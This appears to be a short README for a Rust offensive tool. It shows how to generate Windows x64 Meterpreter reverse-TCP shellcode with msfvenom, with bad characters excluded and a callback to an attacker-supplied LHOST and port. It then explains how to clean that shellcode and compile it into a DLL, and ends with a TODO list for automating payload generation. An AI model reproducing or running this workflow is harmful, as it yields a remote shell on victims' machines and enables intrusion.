### Usage with msfvenom

Generate a payload specifying bad characters.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f c -b '\x00\x0a\x0d\x20'
```

Take OutPut from msfvenom and paste into `main.rs` to clean up shellcode

```
cargo run 
```

Take cleaned up output and paste shellcode into `lib.rs` and build to DLL

```
cargo build --release
```

---

TODO 
- Less interactive
- Msfvenom Payload generation included
- Custom `build.rs` to copy and rename dlls. 
